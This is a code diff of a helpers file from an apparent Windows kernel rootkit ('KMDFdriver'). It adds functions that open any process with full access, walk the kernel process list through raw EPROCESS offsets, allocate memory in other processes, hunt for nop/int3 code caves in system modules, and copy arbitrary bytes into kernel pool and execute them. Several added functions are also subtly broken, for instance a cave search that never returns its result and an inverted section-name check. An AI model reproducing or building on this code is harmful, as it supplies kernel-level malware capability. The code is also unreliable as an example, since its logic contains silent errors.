@@ -1,8 +1,229 @@
 #include "helpers.h"
 #pragma warning(disable:4996)
+#pragma warning(disable:4302)
 
 
-BOOL general::FreeAllocatedMemoryADD(PEPROCESS EpDst, ULONG OldState, PVOID BufferAddress, SIZE_T BufferSize) {
+NTSTATUS general_helpers::ExitRootkitRequestADD(PEPROCESS From, PEPROCESS To, ROOTKIT_STATUS StatusCode, NTSTATUS Status, ROOTKIT_MEMORY* RootkInst) {
+	if (From != NULL) {
+		ObDereferenceObject(From);
+	}
+
+	if (To != NULL) {
+		ObDereferenceObject(To);
+	}
+	RootkInst->StatusCode = StatusCode;
+	RootkInst->Status = Status;
+	return Status;
+}
+
+
+NTSTATUS general_helpers::OpenProcessHandleADD(HANDLE* Process, USHORT PID) {
+	OBJECT_ATTRIBUTES ProcessAttr = { 0 };
+	CLIENT_ID ProcessCid = { 0 };
+	ProcessCid.UniqueProcess = (HANDLE)PID;
+	ProcessCid.UniqueThread = NULL;
+	InitializeObjectAttributes(&ProcessAttr, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
+	return ZwOpenProcess(Process, PROCESS_ALL_ACCESS, &ProcessAttr, &ProcessCid);;
+}
+
+
+NTSTATUS general_helpers::CopyStringAfterCharADD(PUNICODE_STRING OgString, PUNICODE_STRING NewString, WCHAR Char) {
+	SIZE_T AfterLength = 0;
+	WCHAR* CharOcc = NULL;
+
+
+	// Check for invalid paramters:
+	if (OgString->Length == 0 || OgString->Buffer == NULL) {
+		return STATUS_INVALID_PARAMETER;
+	}
+
+
+	// Find last occurance and copy string after it:
+	CharOcc = wcsrchr(OgString->Buffer, Char);
+	if (CharOcc == NULL) {
+		NewString->Buffer = (PWCH)ExAllocatePoolWithTag(NonPagedPool, OgString->Length, 'HlCs');
+		if (NewString->Buffer == NULL) {
+			return STATUS_MEMORY_NOT_ALLOCATED;
+		}
+		NewString->Length = OgString->Length;
+		NewString->MaximumLength = OgString->MaximumLength;
+		RtlCopyMemory(NewString->Buffer, OgString->Buffer, OgString->Length);
+		return STATUS_SUCCESS;
+	}
+	else {
+		AfterLength = OgString->Length - ((CharOcc - OgString->Buffer + 1) * sizeof(WCHAR));  // +1 to get to the character AFTER Char
+		if (AfterLength > 0){
+			NewString->Buffer = (PWCH)ExAllocatePoolWithTag(NonPagedPool, AfterLength, 0x53625374);
+
+			if (NewString->Buffer != NULL){
+				NewString->Length = (USHORT)AfterLength;
+				NewString->MaximumLength = (USHORT)AfterLength;
+				RtlCopyMemory(NewString->Buffer, CharOcc + 1, AfterLength);
+				return STATUS_SUCCESS;
+			}
+			else {
+				return STATUS_MEMORY_NOT_ALLOCATED;
+			}
+		}
+		else {
+			return STATUS_INVALID_PARAMETER;
+		}
+	}
+}
+
+
+BOOL general_helpers::CompareUnicodeStringsADD(PUNICODE_STRING First, PUNICODE_STRING Second, USHORT CheckLength) {
+	//USHORT ActualFirstLen = 0;
+	//USHORT ActualSecondLen = 0;
+
+
+	// Check for invalid parameters:
+	if (First == NULL || Second == NULL || First->Buffer == NULL || Second->Buffer == NULL || Second->Length != First->Length) {
+		return FALSE;
+	}
+
+
+	/*
+	// Calculate actual lengths of strings:
+	ActualFirstLen = (USHORT)general::GetActualLengthADD(First);
+	ActualSecondLen = (USHORT)general::GetActualLengthADD(Second);
+
+
+	// Check for invalid parameters in actual string length:
+	if (ActualFirstLen != ActualSecondLen) {
+		return FALSE;
+	}
+	*/
+
+
+	// Compare strings:
+	if (CheckLength == 0) {
+		for (USHORT i = 0; i < First->Length / sizeof(WCHAR); i++) {
+			if (First->Buffer[i] != Second->Buffer[i]) {
+				return FALSE;
+			}
+		}
+	}
+	else {
+		for (USHORT i = 0; i < CheckLength / sizeof(WCHAR); i++) {
+			if (First->Buffer[i] != Second->Buffer[i]) {
+				return FALSE;
+			}
+		}
+	}
+	return TRUE;
+}
+
+
+BOOL general_helpers::IsExistFromIndexADD(PUNICODE_STRING Inner, PUNICODE_STRING Outer, USHORT StartIndex) {
+	// Check for invalid parameters:
+	if (Inner->Length == 0 || Outer->Length == 0 || (StartIndex * sizeof(WCHAR)) + Inner->Length > Outer->Length || Inner->Buffer == NULL || Outer->Buffer == NULL) {
+		return FALSE;
+	}
+
+	// Compare strings:
+	for (USHORT i = 0; i < Inner->Length / sizeof(WCHAR); i++) {
+		if (Inner->Buffer[i] != Outer->Buffer[i + StartIndex]) {
+			return FALSE;
+		}
+	}
+	return TRUE;
+}
+
+
+void general_helpers::PrintUnicodeStringADD(PUNICODE_STRING Str) {
+	if (Str != NULL && Str->Buffer != NULL && Str->Length != 0) {
+		DbgPrintEx(0, 0, "-+-+-\n");
+		for (int stri = 0; stri <= Str->Length / sizeof(WCHAR); stri++) {
+			switch (Str->Buffer[stri]) {
+			case L'\0':
+				DbgPrintEx(0, 0, "Null Terminator\n"); break;
+			case L'\n':
+				DbgPrintEx(0, 0, "New Line\n"); break;
+			default:
+				DbgPrintEx(0, 0, "%c\n", Str->Buffer[stri]); break;
+			}
+		}
+		DbgPrintEx(0, 0, "+-+-+\n");
+	}
+}
+
+
+BOOL general_helpers::ComparePathFileToFullPathADD(PUNICODE_STRING FullPath, PUNICODE_STRING Path, PUNICODE_STRING FileName) {
+	BOOL CompRes = FALSE;
+	UNICODE_STRING ConjoinedName = { 0 };
+	if (Path->Length == 2 * sizeof(WCHAR)) {
+		ConjoinedName.Buffer = (PWCH)ExAllocatePoolWithTag(NonPagedPool, Path->Length + FileName->Length - 1, 'CpFf');  // Can only be L"\\ + nullterm"
+	}
+	else {
+		ConjoinedName.Buffer = (PWCH)ExAllocatePoolWithTag(NonPagedPool, Path->Length + FileName->Length, 'CpFf');  // Not -1 because going to add L'\\'
+	}
+	if (ConjoinedName.Buffer == NULL || Path->Length != 0) {
+		return FALSE;
+	}
+
+	RtlCopyMemory(ConjoinedName.Buffer, Path->Buffer, Path->Length);
+	ConjoinedName.Buffer[Path->Length / sizeof(WCHAR)] = L'\\';  // Path does not end with L'\\' and name does not start with L'\\'
+	RtlCopyMemory((PVOID)((ULONG64)ConjoinedName.Buffer + Path->Length + sizeof(WCHAR)), FileName->Buffer, FileName->Length + sizeof(WCHAR));
+	CompRes = CompareUnicodeStringsADD(&ConjoinedName, FullPath, 0);
+	ExFreePool(ConjoinedName.Buffer);
+	return CompRes;
+}
+
+
+NTSTATUS general_helpers::GetPidNameFromListADD(USHORT* ProcessId, char ProcessName[15], BOOL NameGiven) {
+	char CurrentProcName[15] = { 0 };
+	PEPROCESS CurrentProcess = NULL;
+	LIST_ENTRY* CurrentList = NULL;
+	LIST_ENTRY* PreviousList = NULL;
+	LIST_ENTRY* NextList = NULL;
+	CurrentProcess = PsInitialSystemProcess;
+	PreviousList = (LIST_ENTRY*)((ULONG64)CurrentProcess + EPOF_ActiveProcessLinks);
+	CurrentList = PreviousList->Flink;
+	NextList = CurrentList->Flink;
+
+	while (CurrentList != NULL) {
+		if (!NameGiven) {
+			if (((USHORT)((ULONG64)CurrentList - EPOF_ActiveProcessLinks + EPOF_UniqueProcessId)) == *ProcessId) {
+				RtlCopyMemory(ProcessName, (char*)((ULONG64)CurrentList - EPOF_ActiveProcessLinks + EPOF_ImageFileName), 15);
+				DbgPrintEx(0, 0, "KMDFdriver GetPidNameFromListADD - Found name %s for PID %hu\n", ProcessName, *ProcessId);
+				return STATUS_SUCCESS;
+			}
+		}
+		else {
+			RtlCopyMemory(CurrentProcName, (char*)((ULONG64)CurrentList - EPOF_ActiveProcessLinks + EPOF_ImageFileName), 15);
+			if (strcmp(CurrentProcName, ProcessName) == 0) {
+				*ProcessId = ((USHORT)((ULONG64)CurrentList - EPOF_ActiveProcessLinks + EPOF_UniqueProcessId));
+				DbgPrintEx(0, 0, "KMDFdriver GetPidNameFromListADD - Found PID %hu for name %s\n", *ProcessId, ProcessName);
+				return STATUS_SUCCESS;
+			}
+		}
+		PreviousList = CurrentList;
+		CurrentList = NextList;
+		NextList = CurrentList->Flink;
+		CurrentProcess = (PEPROCESS)((ULONG64)CurrentList - EPOF_ActiveProcessLinks);
+	}
+	return STATUS_NOT_FOUND;
+}
+
+
+ULONG general_helpers::GetActualLengthADD(PUNICODE_STRING String) {
+	ULONG StringLength = 0;
+	if (String == NULL || String->Buffer == NULL) {
+		return 0;
+	}
+	while (String->Buffer[StringLength] != L'\0') {
+		StringLength++;
+	}
+	String->Length = (USHORT)(StringLength * sizeof(WCHAR));
+	String->MaximumLength = (USHORT)(StringLength * sizeof(WCHAR));
+	return StringLength;
+}
+
+
+
+
+BOOL memory_helpers::FreeAllocatedMemoryADD(PEPROCESS EpDst, ULONG OldState, PVOID BufferAddress, SIZE_T BufferSize) {
 	KAPC_STATE DstState = { 0 };
 	NTSTATUS Status = STATUS_UNSUCCESSFUL;
 	MEMORY_BASIC_INFORMATION MemoryBasic = { 0 };
@@ -61,13 +282,11 @@ BOOL general::FreeAllocatedMemoryADD(PEPROCESS EpDst, ULONG OldState, PVOID Buff
 }
 
 
-
-
-PVOID general::AllocateMemoryADD(PVOID InitialAddress, SIZE_T AllocSize, KAPC_STATE* CurrState, ULONG_PTR ZeroBits) {
+PVOID memory_helpers::AllocateMemoryADD(PVOID InitialAddress, SIZE_T AllocSize, KAPC_STATE* CurrState, ULONG_PTR ZeroBits) {
 	MEMORY_BASIC_INFORMATION MemoryBasic = { 0 };
 	PVOID AllocationAddress = NULL;
 	NTSTATUS Status = STATUS_UNSUCCESSFUL;
-	
+
 
 	// Check for invalid paramters:
 	if (InitialAddress == NULL || AllocSize == 0) {
@@ -155,142 +374,121 @@ PVOID general::AllocateMemoryADD(PVOID InitialAddress, SIZE_T AllocSize, KAPC_ST
 }
 
 
-
-
-ULONG64 general::GetHighestUserModeAddrADD() {
+ULONG64 memory_helpers::GetHighestUserModeAddrADD() {
 	UNICODE_STRING MaxUserSym;
 	RtlInitUnicodeString(&MaxUserSym, L"MmHighestUserAddress");
 	return (ULONG64)MmGetSystemRoutineAddress(&MaxUserSym);
 }
 
 
-
-
-NTSTATUS general::ExitRootkitRequestADD(PEPROCESS From, PEPROCESS To, ROOTKIT_STATUS StatusCode, NTSTATUS Status, ROOTKIT_MEMORY* RootkInst) {
-	if (From != NULL) {
-		ObDereferenceObject(From);
+typedef void(*EmptyFunction)(VOID);
+void memory_helpers::ExecuteInstructionsADD(BYTE Instructions[], SIZE_T InstructionsSize) {
+	BYTE RetOpcode = 0xC3;
+	EmptyFunction FunctionCall = NULL;
+	PVOID InstructionsPool = ExAllocatePoolWithTag(NonPagedPool, InstructionsSize + 1, 'TpIe');
+	if (InstructionsPool != NULL) {
+		RtlCopyMemory(InstructionsPool, Instructions, InstructionsSize);
+		RtlCopyMemory((PVOID)((ULONG64)InstructionsPool + InstructionsSize), &RetOpcode, 1);  // call will push return address
+		FunctionCall = (EmptyFunction)InstructionsPool;
+		FunctionCall();
 	}
-
-	if (To != NULL) {
-		ObDereferenceObject(To);
-	}
-	RootkInst->StatusCode = StatusCode;
-	RootkInst->Status = Status;
-	return Status;
 }
 
 
-
-
-NTSTATUS general::OpenProcessHandleADD(HANDLE* Process, USHORT PID) {
-	OBJECT_ATTRIBUTES ProcessAttr = { 0 };
-	CLIENT_ID ProcessCid = { 0 };
-	ProcessCid.UniqueProcess = (HANDLE)PID;
-	ProcessCid.UniqueThread = NULL;
-	InitializeObjectAttributes(&ProcessAttr, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
-	return ZwOpenProcess(Process, PROCESS_ALL_ACCESS, &ProcessAttr, &ProcessCid);;
-}
-
-
-
-
-NTSTATUS general::CopyStringAfterCharADD(PUNICODE_STRING OgString, PUNICODE_STRING NewString, WCHAR Char) {
-	SIZE_T AfterLength = 0;
-	WCHAR* CharOcc = NULL;
-
-
-	// Check for invalid paramters:
-	if (OgString->Length == 0 || OgString->Buffer == NULL) {
-		return STATUS_INVALID_PARAMETER;
-	}
-
-
-	// Find last occurance and copy string after it:
-	CharOcc = wcsrchr(OgString->Buffer, Char);
-	if (CharOcc == NULL) {
-		NewString->Buffer = (PWCH)ExAllocatePoolWithTag(NonPagedPool, OgString->Length, 'HlCs');
-		if (NewString->Buffer == NULL) {
-			return STATUS_MEMORY_NOT_ALLOCATED;
-		}
-		NewString->Length = OgString->Length;
-		NewString->MaximumLength = OgString->MaximumLength;
-		RtlCopyMemory(NewString->Buffer, OgString->Buffer, OgString->Length);
-		return STATUS_SUCCESS;
-	}
-	else {
-		AfterLength = OgString->Length - ((CharOcc - OgString->Buffer + 1) * sizeof(WCHAR));  // +1 to get to the character AFTER Char
-		if (AfterLength > 0){
-			NewString->Buffer = (PWCH)ExAllocatePoolWithTag(NonPagedPool, AfterLength, 0x53625374);
-
-			if (NewString->Buffer != NULL){
-				NewString->Length = (USHORT)AfterLength;
-				NewString->MaximumLength = (USHORT)AfterLength;
-				RtlCopyMemory(NewString->Buffer, CharOcc + 1, AfterLength);
-				return STATUS_SUCCESS;
-			}
-			else {
-				return STATUS_MEMORY_NOT_ALLOCATED;
-			}
+PVOID memory_helpers::FindUnusedMemoryADD(BYTE* SearchSection, ULONG SectionSize, SIZE_T NeededLength) {
+	for (ULONG sectioni = 0, sequencecount = 0; sectioni < SectionSize; sectioni++){
+		if (SearchSection[sectioni] == 0x90 || SearchSection[sectioni] == 0xCC) {
+			sequencecount++;
 		}
 		else {
-			return STATUS_INVALID_PARAMETER;
+			sequencecount = 0;  // If sequence does not include nop/int3 instruction for long enough - start a new sequence
+		}
+		if (sequencecount == NeededLength) {
+			(PVOID)((ULONG64)SearchSection + sectioni - SectionSize + 1);  // Get starting address of the matching sequence
 		}
 	}
+	return NULL;
+}
+
+
+PVOID memory_helpers::GetModuleBaseAddressADD(const char* ModuleName) {
+	PSYSTEM_MODULE_INFORMATION SystemModulesInfo = NULL;
+	PSYSTEM_MODULE CurrentSystemModule = { 0 };
+	ULONG InfoSize = 0;
+	NTSTATUS Status = ZwQuerySystemInformation(SystemModuleInformation, 0, InfoSize, &InfoSize);
+	if (InfoSize == 0){
+		DbgPrintEx(0, 0, "KMDFdriver GetModuleBaseAddressADD - did not return the needed size\n");
+		return NULL;
+	}
+
+	SystemModulesInfo = (PSYSTEM_MODULE_INFORMATION)ExAllocatePoolWithTag(NonPagedPool, InfoSize, 'MbAp');
+	if (SystemModulesInfo == NULL){
+		DbgPrintEx(0, 0, "KMDFdriver GetModuleBaseAddressADD - cannot allocate memory for system modules information\n");
+		return NULL;
+	}
+
+	Status = ZwQuerySystemInformation(SystemModuleInformation, SystemModulesInfo, InfoSize, &InfoSize);
+	if (!NT_SUCCESS(Status)){
+		DbgPrintEx(0, 0, "KMDFdriver GetModuleBaseAddressADD - query failed with status 0x%x\n", Status);
+		ExFreePool(SystemModulesInfo);
+		return NULL;
+	}
+
+	for (ULONG modulei = 0; modulei < SystemModulesInfo->ModulesCount; ++modulei)
+	{
+		CurrentSystemModule = &SystemModulesInfo->Modules[modulei];
+		if (strcmp(CurrentSystemModule->ImageName, ModuleName) == 0){
+			ExFreePool(SystemModulesInfo);
+			return CurrentSystemModule->Base;
+		}
+	}
+	ExFreePool(SystemModulesInfo);
+	return NULL;
+}
+
+
+PIMAGE_SECTION_HEADER memory_helpers::GetSectionHeaderFromName(PVOID ModuleBaseAddress, const char* SectionName) {
+	if (ModuleBaseAddress == NULL || SectionName == NULL) {
+		return NULL;
+	}
+	PIMAGE_DOS_HEADER DosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(ModuleBaseAddress);
+	PIMAGE_NT_HEADERS NtHeader = (PIMAGE_NT_HEADERS)(ModuleBaseAddress + DosHeader->e_lfanew);
+	PIMAGE_SECTION_HEADER CurrentSection = IMAGE_FIRST_SECTION(NtHeader);
+
+	PIMAGE_SECTION_HEADER psection_hdr = nullptr;
+
+	const auto NumberOfSections = NtHeader->FileHeader.NumberOfSections;
+
+	for (ULONG sectioni = 0; sectioni < NtHeader->FileHeader.NumberOfSections; ++sectioni){
+		if (strcmp((char*)CurrentSection->Name, SectionName)) {
+			return CurrentSection;
+		}
+		++CurrentSection;
+	}
+	return NULL;
+}
+
+
+PVOID memory_helpers::GetTextSectionOfSystemModuleADD(PVOID ModuleBaseAddress, ULONG* TextSectionSize) {
+	PIMAGE_SECTION_HEADER TextSectionBase = NULL;
+	if (ModuleBaseAddress == NULL) {
+		return NULL;
+	}
+	TextSectionBase = memory_helpers::GetSectionHeaderFromName(ModuleBaseAddress, ".text");
+	if (TextSectionBase == NULL) {
+		return NULL;
+	}
+
+	if (TextSectionSize != NULL) {
+		*TextSectionSize = TextSectionBase->Misc.VirtualSize;
+	}
+	return (ULONG64)ModuleBaseAddress + TextSectionBase->VirtualAddress;
 }
 
 
 
 
-BOOL general::CompareUnicodeStringsADD(PUNICODE_STRING First, PUNICODE_STRING Second, USHORT CheckLength) {
-	USHORT Size = First->Length;
-
-
-	// Check for invalid parameters:
-	if (First->Length != Second->Length || First->Buffer == NULL || Second->Buffer == NULL) {
-		return FALSE;
-	}
-
-
-	// Compare strings:
-	if (CheckLength == 0) {
-		for (USHORT i = 0; i < Size / sizeof(WCHAR); i++) {
-			if (First->Buffer[i] != Second->Buffer[i]) {
-				return FALSE;
-			}
-		}
-	}
-	else {
-		for (USHORT i = 0; i < CheckLength / sizeof(WCHAR); i++) {
-			if (First->Buffer[i] != Second->Buffer[i]) {
-				return FALSE;
-			}
-		}
-	}
-	return TRUE;
-}
-
-
-
-
-BOOL general::IsExistFromIndexADD(PUNICODE_STRING Inner, PUNICODE_STRING Outer, USHORT StartIndex) {
-	// Check for invalid parameters:
-	if (Inner->Length == 0 || Outer->Length == 0 || (StartIndex * sizeof(WCHAR)) + Inner->Length > Outer->Length || Inner->Buffer == NULL || Outer->Buffer == NULL) {
-		return FALSE;
-	}
-
-	// Compare strings:
-	for (USHORT i = 0; i < Inner->Length / sizeof(WCHAR); i++) {
-		if (Inner->Buffer[i] != Outer->Buffer[i + StartIndex]) {
-			return FALSE;
-		}
-	}
-	return TRUE;
-}
-
-
-
-
-RKSYSTEM_INFORET requests::RequestSystemInfoADD(SYSTEM_INFORMATION_CLASS InfoType, ULONG64 Flag) {
+RKSYSTEM_INFORET requests_helpers::RequestSystemInfoADD(SYSTEM_INFORMATION_CLASS InfoType, ULONG64 Flag) {
 	NTSTATUS Status = STATUS_UNSUCCESSFUL;
 	PVOID Buffer = NULL;
 	ULONG BufferSize = 0;
@@ -368,9 +566,7 @@ RKSYSTEM_INFORET requests::RequestSystemInfoADD(SYSTEM_INFORMATION_CLASS InfoTyp
 }
 
 
-
-
-SIZE_T requests::GetExpectedInfoSizeADD(SYSTEM_INFORMATION_CLASS InfoType) {
+SIZE_T requests_helpers::GetExpectedInfoSizeADD(SYSTEM_INFORMATION_CLASS InfoType) {
 	SYSTEM_BASIC_INFORMATION SystemBasic = { 0 };
 	if (!NT_SUCCESS(ZwQuerySystemInformation(SystemBasicInformation, &SystemBasic, sizeof(SystemBasic), NULL))) {
 		return 0;
